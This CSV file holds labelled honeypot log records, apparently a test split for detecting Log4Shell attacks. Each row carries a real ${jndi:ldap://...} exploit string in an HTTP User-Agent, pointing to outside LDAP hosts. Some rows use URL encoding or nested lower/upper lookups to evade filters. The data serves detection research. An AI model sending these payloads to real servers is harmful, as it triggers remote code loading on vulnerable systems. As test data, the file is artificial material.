id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004370,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2673463270/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2673463270/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004381,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261905984/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261905984/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004382,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://45.83.193.150:1389/Exploit} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://45.83.193.150:1389/exploit} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004383,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/3165023819/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/3165023819/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004384,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813105538/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813105538/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004385,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2994790553/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2994790553/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004386,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2328209650/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2328209650/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004387,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261850899/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261850899/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004388,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2673453200/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2673453200/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004389,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2673463270/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2673463270/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004390,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2769703975/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2769703975/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004391,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813106041/8099/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813106041/8099/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004392,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261851436/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261851436/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004393,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813105538/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813105538/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004394,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2673453200/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2673453200/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004395,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2783148894/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2783148894/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004396,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2319715482/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2319715482/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004397,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261850899/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261850899/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004398,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2310558957/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2310558957/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004399,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261905984/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261905984/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004400,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2328209650/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2328209650/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004401,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2310558946/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2310558946/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004402,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2806495285/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2806495285/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004403,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813106041/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813106041/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004404,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2310558957/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2310558957/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004405,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813105538/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813105538/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004406,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2335914564/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2335914564/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004407,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813106041/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813106041/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004408,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261851436/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261851436/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004409,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2673453200/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2673453200/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004410,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2783148894/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2783148894/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004411,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261850899/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261850899/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004412,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2994790553/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2994790553/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004413,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2806495285/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2806495285/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004414,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2673463270/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2673463270/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004415,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/3165023819/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/3165023819/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004416,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2808300507/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2808300507/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004417,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2682193288/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2682193288/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004418,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2310558946/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2310558946/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004419,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2319715482/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2319715482/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004420,2026-05-17,honeynet_log4shell,Request from User-Agent: %24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://193.3.19.159:53/c} | method: get | host: external-feed | path: /,1,log4shell,url_encoded,external,external_greedybear_test,critical
LS-004421,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2813106041/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2813106041/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004422,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2783148894/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2783148894/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004423,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2310558957/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2310558957/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004424,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2769703975/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2769703975/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004425,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2261851436/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2261851436/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004426,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2328217531/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2328217531/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004427,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://193.3.19.159:53/c} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://193.3.19.159:53/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004428,2026-05-17,honeynet_log4shell,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2F193.3.19.159%3A53%2Fc%7D | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://193.3.19.159:53/c} | method: get | host: external-feed | path: /,1,log4shell,url_encoded,external,external_greedybear_test,critical
LS-004429,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://xf.world80.log4j.binaryedge.io:80/callback} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_lower_upper_lookup,external,external_greedybear_test,critical
